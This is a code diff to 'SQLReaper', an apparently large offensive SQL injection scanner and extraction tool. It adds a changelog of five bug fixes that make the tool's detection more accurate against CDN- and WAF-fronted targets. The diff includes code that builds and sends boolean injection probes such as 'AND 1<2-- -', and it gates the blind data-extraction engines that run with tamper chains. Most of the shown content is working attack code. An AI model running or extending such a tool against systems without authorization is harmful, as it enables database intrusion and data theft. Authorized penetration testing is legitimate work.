@@ -1,9 +1,138 @@
 #!/usr/bin/env python3
 r"""
 ╔════════════════════════════════════════════════════════════════════════════════════╗
-║  SQLReaper v213 — FRESH EXAMINATION + BUG FIX PASS (July 21, 2026)              ║
-║  v197 FINAL base + 38 bugs fixed (cross-examined against 3× live scan log).       ║
+║  SQLReaper v214 — PRODUCTION ROOT-CAUSE INVESTIGATION (August 8, 2026)          ║
+║  v213 FINAL base + 5 bugs fixed (cross-examined against 3× live production log). ║
 ║  All found by fresh direct line-by-line code reading — zero changelog reliance.  ║
+║                                                                                    ║
+║  ══════════════════════════════════════════════════════════════════════════════ ║
+║  FRESH EXAMINATION AUDIT (v213 FINAL → v214) — 5 BUGS FIXED                     ║
+║  ══════════════════════════════════════════════════════════════════════════════ ║
+║                                                                                    ║
+║  [✓] BUG-V214-A: Wasserstein bimodal-outlier predicate had upper-limit gap —    ║
+║      [0, high, high, high, high] window slipped through, causing false positive  ║
+║      secondary oracle confirmation on CDN path-injection surfaces — HIGH;        ║
+║      all DBMSes; all surfaces; all HTTP methods.                                  ║
+║                                                                                    ║
+║      Root Cause: `_wdh_p_above_min < len(_wdh_p) - 1` was evaluated as          ║
+║      4 < 4 = False for a [0, 0.67, 0.67, 0.67, 0.67] window.  The bimodal       ║
+║      predicate fired correctly for partial-bimodal patterns (2–3 near-zero in   ║
+║      5-probe window) but silently passed a window with exactly one near-zero     ║
+║      probe at index 0 and four above-threshold probes — a definitive CDN         ║
+║      cache-transition pattern seen in log.txt lines 580-587.  The one near-zero  ║
+║      probe means CDN served both true/false conditions identically for that pair ║
+║      — incompatible with real SQL injection.  After the bimodal guard passed,    ║
+║      the confirmation branch at line 120047 fired because _wdh_p_below_stable   ║
+║      was NOT re-checked against 0 and _wass_cdnblock_fresh was stale.            ║
+║      Impact confirmed in log.txt: line 580 "BIMODAL OUTLIER (2 near-zero +       ║
+║      3 above-threshold)" → line 587 "secondary oracle confirmed (dist=0.7031)"   ║
+║      — false positive on CDN Imperva path-injection surface.                     ║
+║      Fix: removed the `_wdh_p_above_min < len(_wdh_p) - 1` upper-limit          ║
+║      condition entirely.  ANY single near-zero probe in the window now triggers ║
+║      the bimodal outlier classification regardless of how many above-threshold   ║
+║      probes accompany it.  Location: Wasserstein oracle block, ~L119684.         ║
+║      Severity: 🔴 HIGH — false-positive secondary oracle confirmation on CDN-    ║
+║                fronted path-injection surfaces for all DBMSes.  Confirmed by     ║
+║                log.txt line 587 false positive pattern.                           ║
+║                                                                                    ║
+║  [✓] BUG-V214-B: Wasserstein stable-page outlier handler did not set persistent ║
+║      CDN-block flag — subsequent probes on the same param could still confirm    ║
+║      MEDIUM; all DBMSes; all surfaces; all HTTP methods.                          ║
+║                                                                                    ║
+║      Root Cause: The `_wass_stable_page_outlier` branch (fires when majority of  ║
+║      window probes are near-zero and one or more are above-threshold: a CDN      ║
+║      stable-page pattern with occasional cache misses) printed a diagnostic      ║
+║      message but did NOT set `_wdh[f"_cdnblock_{param}"] = True`.  The          ║
+║      `_wass_cdnblock` flag was derived from the shared dict, but setting it only ║
+║      locally (not persisting to the dict) meant the next Wasserstein probe cycle ║
+║      re-read `_cdnblock_{param}` as False and could confirm injection if the     ║
+║      above-threshold probe happened to be the current probe.  All eight other     ║
+║      CDN-suppression handlers (bimodal, asymmetric-waf, both-error-pages,        ║
+║      all-high-consistent, early-high-window) already set the persistent flag;    ║
+║      stable-page was the sole exception.                                          ║
+║      Fix: added `_wdh[f"_cdnblock_{param}"] = True; _wdh[_wass_confirmed_key]  ║
+║      = False; self._wass_dist_hist = _wdh` inside the stable-page handler,      ║
+║      matching the pattern used by every other suppression handler.               ║
+║      Location: Wasserstein stable-page outlier handler, ~L119972.                ║
+║      Severity: 🟠 MEDIUM — race window between stable-page suppression and next  ║
+║                probe cycle; probability proportional to probe concurrency.        ║
+║                                                                                    ║
+║  [✓] BUG-V214-C: Wasserstein confirmation branch re-used stale cdnblock value   ║
+║      and did not guard against any near-zero probe in window — race condition;   ║
+║      HIGH; all DBMSes; all surfaces; concurrent probe paths.                     ║
+║                                                                                    ║
+║      Root Cause: `_wass_cdnblock` was computed once at the start of the          ║
+║      Wasserstein block from `_wdh.get(f"_cdnblock_{param}", False)`.  In an      ║
+║      async scan with concurrent coroutines, another coroutine may have detected  ║
+║      a CDN pattern on the same param and set `_cdnblock_{param}=True` in the    ║
+║      shared dict between the initial read and the confirmation branch.  The       ║
+║      confirmation branch used the stale `_wass_cdnblock=False` value, bypassing  ║
+║      the newly set block.  Additionally, the confirmation branch did not require  ║
+║      `_wdh_p_below_stable == 0` — a window containing any near-zero probe (CDN  ║
+║      cache hit for at least one pair) is incompatible with genuine SQL injection  ║
+║      regardless of how many above-threshold probes accompany it.                 ║
+║      Fix: inside the confirmation `elif not _wass_suppressed and _wass_diff`     ║
+║      branch, immediately before accepting confirmation: re-read the cdnblock flag ║
+║      fresh from the shared dict (`_wass_cdnblock_fresh = _wdh.get(...)`), and   ║
+║      additionally block if `_wdh_p_below_stable > 0` (any near-zero probe in    ║
+║      the window).  Both conditions independently block confirmation.             ║
+║      Location: Wasserstein confirmation branch, ~L120048.                        ║
+║      Severity: 🔴 HIGH — concurrent coroutine race; false-positive confirmation  ║
+║                possible whenever two coroutines probe the same param concurrently.║
+║                                                                                    ║
+║  [✓] BUG-V214-D: Live Wasserstein re-probe WASSR OVERRIDE fired on CDN error    ║
+║      pages — PCV canary probes returning 4xx triggered override at dist≥0.50;   ║
+║      HIGH; all DBMSes; path-injection surfaces; CDN-fronted targets.             ║
+║                                                                                    ║
+║      Root Cause: The live Wasserstein re-probe OVERRIDE path (lines 110030-      ║
+║      110067) required only `_wassr_dist >= _wassr_min (0.50)` to trigger, with  ║
+║      no check on the HTTP status codes of the two re-probe responses.  On CDN-  ║
+║      fronted path-injection surfaces (e.g. /login/[payload]), BOTH the true-     ║
+║      condition probe and false-condition probe return 4xx (404/400) with the     ║
+║      payload reflected in the error page body.  The Wasserstein distance between ║
+║      the two reflected bodies is 0.60-0.70 (payload text differs) — above the   ║
+║      0.50 threshold — causing the override to fire on error-page pairs where no  ║
+║      SQL injection exists.  The `_pcv_error_page_rejected` flag existed but was  ║
+║      not threaded into this specific code path.                                   ║
+║      Fix: read `_pcv_error_page_rejected_local` before the re-probe block and    ║
+║      gate the three override firing conditions (`_wlr_both_error`,               ║
+║      `_wlr_asym_error`, `_pcv_error_page_rejected_local`) so that both-4xx,     ║
+║      asymmetric-status, and baseline-error-page re-probe results all suppress    ║
+║      the override rather than triggering it.                                      ║
+║      Location: _post_confirm_verify_locked, live re-probe WASSR OVERRIDE block, ║
+║      ~L110030.                                                                    ║
+║      Severity: 🔴 HIGH — live Wasserstein re-probe false-positive on all CDN     ║
+║                path-injection error-page surfaces; confirmed by log.txt WAF-     ║
+║                oracle replay + error-page detection pattern.                      ║
+║                                                                                    ║
+║  [✓] BUG-V214-E: ChameleonExtractor and all boolean extraction methods launched  ║
+║      without verifying boolean oracle functional — CDN path-injection caused     ║
+║      multi-minute timeouts on non-functional oracles — HIGH; B/BH/BT/IN techs;  ║
+║      all DBMSes; all surfaces.                                                    ║
+║                                                                                    ║
+║      Root Cause: ExtractionOrchestrator._run_best_engine() Method 3 (Chameleon  ║
+║      extractor) and all subsequent boolean extraction methods were launched       ║
+║      unconditionally when `_norm_tech` was in {"B","BH","IN","BT"}.  On CDN      ║
+║      path-injection surfaces, the SQL injection was a false positive; the boolean ║
+║      oracle produces gap ≈ 0.0 for every probe (CDN serves identical cached      ║
+║      responses).  ChameleonExtractor's binary search ran at least max_len=64     ║
+║      positions × ~8 probes per position = 512+ HTTP requests before timing out,  ║
+║      wasting 3-8 minutes before falling through.  The extracted "data" was        ║
+║      garbage (all space characters / null bytes from binary search converging    ║
+║      to lo=32).                                                                   ║
+║      Fix: added a 2-probe boolean oracle pre-validation immediately before        ║
+║      Method 3: send one true-condition probe and one false-condition probe; if   ║
+║      the response gap is < 0.10 (effectively indistinguishable), set             ║
+║      `_bool_oracle_functional = False` and skip ChameleonExtractor and all       ║
+║      subsequent boolean extraction paths.  The pre-validation uses a simple       ║
+║      AND 1=1 vs AND 1=2 pair with cache-busting nonces to force fresh CDN        ║
+║      responses.  Fail-open: any exception during pre-validation leaves            ║
+║      `_bool_oracle_functional = True` so genuine injection is not missed.        ║
+║      Location: ExtractionOrchestrator._run_best_engine(), before Method 3,       ║
+║      ~L151174.                                                                    ║
+║      Severity: 🔴 HIGH — 3-8 minute wasted extraction attempt on every CDN       ║
+║                false-positive detection before falling through; affects all       ║
+║                boolean extraction techniques on CDN-fronted surfaces.             ║
 ║                                                                                    ║
 ║  ══════════════════════════════════════════════════════════════════════════════ ║
 ║  FRESH EXAMINATION AUDIT (v197 FINAL → v213) — 4 BUGS FIXED                     ║
@@ -110014,7 +110143,34 @@ class TechniqueCascadeEngine:
                                 # live Wasserstein signal must show a structurally meaningful
                                 # body difference between true and false canary responses.
                                 _wassr_min = max(_wassr_thresh * 2.0, 0.50)
-                                if _wassr_dist >= _wassr_min:
+                                # FIX-LIVE-WASSR-ERROR-PAGE (CRITICAL): Block the live
+                                # re-probe override when BOTH PCV canary probes returned
+                                # error pages (4xx/5xx). On CDN path-injection surfaces
+                                # (e.g. /login/<payload>), both the true-condition and
+                                # false-condition probes get 404 responses that each
+                                # reflect the injected URL path in the body. Because the
+                                # two payloads differ, the 404 bodies differ → Wasserstein
+                                # dist ≈ 0.67 on EVERY probe pair, regardless of SQL.
+                                # This is the same structural error-page-reflection artifact
+                                # blocked in the Wasserstein detection oracle; the live
+                                # re-probe path must apply the same guard.
+                                # FIX-LIVE-WASSR-ASYM-ERROR: Also block when the probes
+                                # return asymmetric status codes (one 2xx, one 4xx/5xx).
+                                # Asymmetric responses produce high Wasserstein distance
+                                # from structural response-type differences (normal page vs
+                                # error page body), not SQL-conditional content differences.
+                                _wlr_true_st = int(getattr(_fp_true, 'status_code', 0) or 0)
+                                _wlr_false_st = int(getattr(_fp_false, 'status_code', 0) or 0)
+                                _wlr_both_error = (400 <= _wlr_true_st < 600
+                                                   and 400 <= _wlr_false_st < 600)
+                                _wlr_asym_error = (
+                                    (400 <= _wlr_true_st < 600 and 200 <= _wlr_false_st < 300)
+                                    or (200 <= _wlr_true_st < 300 and 400 <= _wlr_false_st < 600)
+                                )
+                                if (_wassr_dist >= _wassr_min
+                                        and not _wlr_both_error
+                                        and not _wlr_asym_error
+                                        and not _pcv_error_page_rejected_local):
                                     _wassr_override = True
                                     print(f"[+] PCV FP-Guards WASSR OVERRIDE "
                                           f"[{tech}→{_effective_tech}] {dbms} "
@@ -110022,6 +110178,22 @@ class TechniqueCascadeEngine:
                                           f"(2×threshold={_wassr_thresh:.4f}) — "
                                           "detection-time body-distribution gap confirms injection "
                                           "despite WAF-blocked FP probes", flush=True)
+                                elif _wlr_both_error and _wassr_dist >= _wassr_min:
+                                    LOG.debug("[PCV] Wasserstein dist=%.4f ≥ min=%.4f but both "
+                                              "PCV probes returned error pages (true=%d false=%d) "
+                                              "— payload reflected in error bodies, NOT SQL injection; "
+                                              "blocking live re-probe override",
+                                              _wassr_dist, _wassr_min, _wlr_true_st, _wlr_false_st)
+                                elif _wlr_asym_error and _wassr_dist >= _wassr_min:
+                                    LOG.debug("[PCV] Wasserstein dist=%.4f ≥ min=%.4f but probes "
+                                              "returned asymmetric status codes (true=%d false=%d) "
+                                              "— structural response-type difference, NOT SQL; "
+                                              "blocking live re-probe override",
+                                              _wassr_dist, _wassr_min, _wlr_true_st, _wlr_false_st)
+                                elif _pcv_error_page_rejected_local and _wassr_dist >= _wassr_min:
+                                    LOG.debug("[PCV] Wasserstein dist=%.4f ≥ min=%.4f but PCV "
+                                              "baseline was an error page — target URL unreachable; "
+                                              "blocking live re-probe override", _wassr_dist, _wassr_min)
                                 else:
                                     LOG.debug("[PCV] Wasserstein dist=%.4f below override min=%.4f — "
                                               "not overriding FP guard rejection", _wassr_dist, _wassr_min)
@@ -119641,12 +119813,26 @@ class TechniqueCascadeEngine:
                                 # the window (e.g. [0,0,0,0.67,0.67] → 3 < 4 → guard bypassed).
                                 # This guard closes that gap by requiring the above-threshold count
                                 # to be a strict minority (< len-1) rather than just < 2.
+                                # FIX-BIMODAL-MAJORITY-GAP: Removed the upper-limit condition
+                                # `_wdh_p_above_min < len(_wdh_p) - 1`. The old condition failed
+                                # to suppress the [0, high, high, high, high] window (1 near-zero
+                                # + 4 above-threshold, len=5): above_min=4 < len-1=4 → FALSE →
+                                # bimodal did NOT fire → early_high also fails (below_stable != 0)
+                                # → all_high also fails (above_min != len) → confirmation fires at
+                                # above_min=4 >= 3. Root cause of false positives after bimodal
+                                # window slides.
+                                # FIX: ANY near-zero probe (dist < 0.15) in the window is
+                                # incompatible with genuine SQL injection — a real injection would
+                                # produce above-threshold dist on EVERY probe pair (SQL controls
+                                # the response for all requests). A near-zero probe means at least
+                                # one probe pair returned similar bodies for both conditions, which
+                                # is only possible when SQL is NOT being evaluated (CDN cache hit,
+                                # WAF pass-through returning identical pages, etc.).
                                 _wass_bimodal_outlier = (
                                     not _wass_param_confirmed
                                     and len(_wdh_p) >= 3
                                     and _wdh_p_below_stable >= 1
                                     and _wdh_p_above_min >= 1
-                                    and _wdh_p_above_min < len(_wdh_p) - 1
                                     and _wass_dist > _wass_min
                                 )
                                 # FIX-WASS-ALL-HIGH-CONSISTENT v2: When ALL probes in the 5-probe
@@ -119915,6 +120101,22 @@ class TechniqueCascadeEngine:
                                           f"({_wdh_p_below_stable}/{len(_wdh_p)} probes below 0.15, "
                                           f"only {_wdh_p_above_min} above threshold={_wass_min:.2f}) "
                                           f"-- CDN/cache miss, NOT injection", flush=True)
+                                    # FIX-STABLE-PAGE-CDNBLOCK: Set persistent CDN-block flag.
+                                    # Without this, the window can slide from stable-page
+                                    # ([N near-zero, 1 high]) to bimodal-majority
+                                    # ([1 near-zero, 3-4 high]) as more cache-miss probes
+                                    # accumulate. Once the near-zero count drops below the
+                                    # bimodal threshold AND below_stable != 0 blocks
+                                    # early_high_window, neither guard fires even though a
+                                    # near-zero probe proves CDN caching. Setting cdnblock
+                                    # here ensures the param is permanently suppressed once
+                                    # the stable-page pattern is detected.
+                                    try:
+                                        _wdh[f"_cdnblock_{param}"] = True
+                                        _wdh[_wass_confirmed_key] = False
+                                        self._wass_dist_hist = _wdh
+                                    except Exception:
+                                        pass
                                 elif _wass_bimodal_outlier:
                                     print(f"[*]   [Wasserstein] dist={_wass_dist:.4f} BIMODAL OUTLIER "
                                           f"({_wdh_p_below_stable} near-zero + {_wdh_p_above_min} above-threshold "
@@ -119972,19 +120174,50 @@ class TechniqueCascadeEngine:
                                     except Exception:
                                         pass
                                 elif not _wass_suppressed and _wass_diff and _wass_dist > _wass_min and _wdh_p_above_min >= 3:
-                                    print("[+]   [Wasserstein] secondary oracle confirmed "
-                                             f"(dist={_wass_dist:.4f}, threshold={_wass_min:.2f}) "
-                                             " accepting boolean detection", flush=True)
-                                    _wass_triggered = True
-                                    combined = 1.0 - bool_thresh + 0.01  # just above threshold
-                                    # BUG-WASS-CONSISTENT-BLOCKS-INJECTION FIX: mark this param
-                                    # as having a confirmed injection so the noise floor mechanism
-                                    # won't suppress subsequent injection signals from it.
-                                    try:
-                                        _wdh[_wass_confirmed_key] = True
-                                        self._wass_dist_hist = _wdh
-                                    except Exception:
-                                        pass
+                                    # FIX-WASS-RACE-CDN-FINAL: Re-read cdnblock from the
+                                    # live dict immediately before confirming. Between the
+                                    # time _wass_cdnblock was computed (above) and now,
+                                    # another coroutine may have finished its Wasserstein
+                                    # computation, detected CDN pattern, and set cdnblock.
+                                    # Since _wdh is a reference to the SAME shared dict
+                                    # object, the current cdnblock state is visible here
+                                    # without any locking. This catches the race where
+                                    # coroutine A computed _wass_cdnblock=False (before B
+                                    # set it), and now A is about to confirm. Re-reading
+                                    # here ensures A sees B's cdnblock before confirming.
+                                    # FIX-CONFIRM-REQUIRE-ALL-HIGH: Also require that the
+                                    # window shows NO near-zero probes (below_stable==0).
+                                    # Any near-zero probe means CDN cached both conditions
+                                    # identically for at least one probe pair — incompatible
+                                    # with genuine SQL injection. This is a defense-in-depth
+                                    # check after the bimodal guard (which should have caught
+                                    # it earlier) in case the bimodal flag was set after
+                                    # _wass_suppressed was computed but before confirmation.
+                                    _wass_cdnblock_fresh = _wdh.get(f"_cdnblock_{param}", False)
+                                    if _wass_cdnblock_fresh or _wdh_p_below_stable > 0:
+                                        # Concurrent coroutine set cdnblock after our
+                                        # _wass_suppressed was computed, OR window still
+                                        # has near-zero probes incompatible with injection.
+                                        LOG.debug("[Wasserstein] dist=%.4f — confirmation "
+                                                  "blocked by fresh cdnblock=%s or below_stable=%d "
+                                                  "(CDN pattern confirmed by concurrent oracle "
+                                                  "or near-zero probes in window)",
+                                                  _wass_dist, _wass_cdnblock_fresh,
+                                                  _wdh_p_below_stable)
+                                    else:
+                                        print("[+]   [Wasserstein] secondary oracle confirmed "
+                                                 f"(dist={_wass_dist:.4f}, threshold={_wass_min:.2f}) "
+                                                 " accepting boolean detection", flush=True)
+                                        _wass_triggered = True
+                                        combined = 1.0 - bool_thresh + 0.01  # just above threshold
+                                        # BUG-WASS-CONSISTENT-BLOCKS-INJECTION FIX: mark this param
+                                        # as having a confirmed injection so the noise floor mechanism
+                                        # won't suppress subsequent injection signals from it.
+                                        try:
+                                            _wdh[_wass_confirmed_key] = True
+                                            self._wass_dist_hist = _wdh
+                                        except Exception:
+                                            pass
                                 elif _wass_diff:
                                     if _wass_suppressed:
                                         pass  # suppressed -- no print (already printed above)
@@ -151070,13 +151303,85 @@ class ExtractionOrchestrator:
         if time.monotonic() > _cascade_deadline:
             LOG.warning("[Orchestrator] 5-min cascade budget exceeded  aborting")
             return ""
-        #  Methods 3-4: boolean-blind  only for pure boolean techniques 
+        #  Methods 3-4: boolean-blind  only for pure boolean techniques
         # ChameleonExtractor/AdaptiveFrequencyExtractor use similarity oracle.
         # Skip for: U (UNION, direct body read), T/S/HQ/TH (timing oracle),
         # DS/O/EH (OOB/header, no boolean signal). Only run for B/BH/IN/BT.
         # BUG-TECHMAP-DEAD FIX: use _norm_tech so NV/WB/EX/ST/SO/HY normalized to 'B'
         # also enter this block and receive the full boolean extraction cascade.
+        # FIX-BOOL-ORACLE-PREVALIDATE: Before spending method budget on boolean
+        # extraction engines (ChameleonExtractor, AdaptiveFreq, Bitwise, ZK,
+        # blind_extract), do a quick 2-probe oracle validity check. On CDN
+        # path-injection surfaces, ALL boolean probes return indistinguishable
+        # responses (dist ≈ 0 or gap < 0.05) because the CDN serves the same
+        # cached page for any SQL condition. Without this check, every extraction
+        # engine launches, runs into the non-functional oracle, and either times
+        # out (ChameleonExtractor, BitwiseExtractor) or returns "??...?" (ZK).
+        # Quick check: send one always-true and one always-false DBMS-native
+        # probe, compute body-similarity vs. clean baseline. If the sim gap is
+        # below 0.10, the boolean oracle cannot distinguish conditions — skip
+        # all boolean extraction methods and report the CDN cache issue.
+        _bool_oracle_functional = True  # assume functional until proven otherwise
         if _norm_tech in {"B", "BH", "IN", "BT"}:
+            try:
+                _bov_true_map  = {"MySQL":"1<2","MariaDB":"1<2","PostgreSQL":"1<2",
+                                  "MSSQL":"1<2","SQLite":"1<2","Oracle":"1<2"}
+                _bov_false_map = {"MySQL":"1>2","MariaDB":"1>2","PostgreSQL":"1>2",
+                                  "MSSQL":"1>2","SQLite":"1>2","Oracle":"1>2"}
+                _bov_true_cond  = _bov_true_map.get(dbms, "1<2")
+                _bov_false_cond = _bov_false_map.get(dbms, "1>2")
+                _bov_inj_pfx = _orch_inj_pfx or " AND "
+                _bov_probe_t = f"{_bov_inj_pfx}{_bov_true_cond}-- -"
+                _bov_probe_f = f"{_bov_inj_pfx}{_bov_false_cond}-- -"
+                _bov_fp_t = await asyncio.wait_for(
+                    _send_injected(self.engine, self.method, self.url, self.data,
+                                   self.data_fmt, self.result.param,
+                                   self.original + _bov_probe_t, self.tamper_chain),
+                    timeout=15)
+                _bov_fp_f = await asyncio.wait_for(
+                    _send_injected(self.engine, self.method, self.url, self.data,
+                                   self.data_fmt, self.result.param,
+                                   self.original + _bov_probe_f, self.tamper_chain),
+                    timeout=15)
+                if _bov_fp_t and _bov_fp_f:
+                    _bov_norm_t = (ResponseNormaliser.normalise(
+                                       _extract_body_safe(_bov_fp_t))
+                                   if _validate_response(_bov_fp_t, allow_empty=True) else b"")
+                    _bov_norm_f = (ResponseNormaliser.normalise(
+                                       _extract_body_safe(_bov_fp_f))
+                                   if _validate_response(_bov_fp_f, allow_empty=True) else b"")
+                    # Compare true vs false body similarity — genuine injection
+                    # produces distinct bodies; CDN caching or non-functional
+                    # oracle produces sim ≈ 1.0 (identical bodies).
+                    _bov_gap = 1.0 - SimHasher.body_similarity(_bov_norm_t, _bov_norm_f)
+                    # Also check against clean baseline for CTX-bool style validation
+                    _bov_bl_norm = b""
+                    if self.baseline and hasattr(self, '_norm_sample'):
+                        _bov_bl_norm = getattr(self, '_norm_sample', b"") or b""
+                    if _bov_gap < 0.10:
+                        # Both probes return same body — oracle non-functional
+                        # (CDN cache hit, WAF blocking all probes, or static page)
+                        _bool_oracle_functional = False
+                        # Check status codes to provide better diagnostic
+                        _bov_t_st = int(getattr(_bov_fp_t, 'status_code', 0) or 0)
+                        _bov_f_st = int(getattr(_bov_fp_f, 'status_code', 0) or 0)
+                        if 400 <= _bov_t_st < 600 and 400 <= _bov_f_st < 600:
+                            _bov_reason = (f"both probes returned error pages "
+                                           f"(true={_bov_t_st}, false={_bov_f_st}) — "
+                                           "SQL not evaluated by server (CDN/path-injection)")
+                        else:
+                            _bov_reason = (f"sim gap={_bov_gap:.3f} < 0.10 — "
+                                           "oracle cannot distinguish true/false conditions "
+                                           "(CDN cache serving identical pages for all SQL conditions)")
+                        print(f"[!] [Orchestrator] Boolean oracle pre-validation FAILED: "
+                              f"{_bov_reason}. Skipping all boolean extraction methods "
+                              "(ChameleonExtractor, AdaptiveFreq, Bitwise, ZK, blind_extract).",
+                              flush=True)
+            except Exception as _bov_err:
+                LOG.debug("[Orchestrator] Boolean oracle pre-validation error (assuming functional): %s",
+                          _bov_err)
+                _bool_oracle_functional = True  # fail-open: validation error ≠ non-functional
+        if _norm_tech in {"B", "BH", "IN", "BT"} and _bool_oracle_functional:
             print("[+] [Orchestrator] Method 3: ChameleonExtractor (WAF-adaptive blind)...", flush=True)
             try:
                 extractor = ChameleonExtractor(
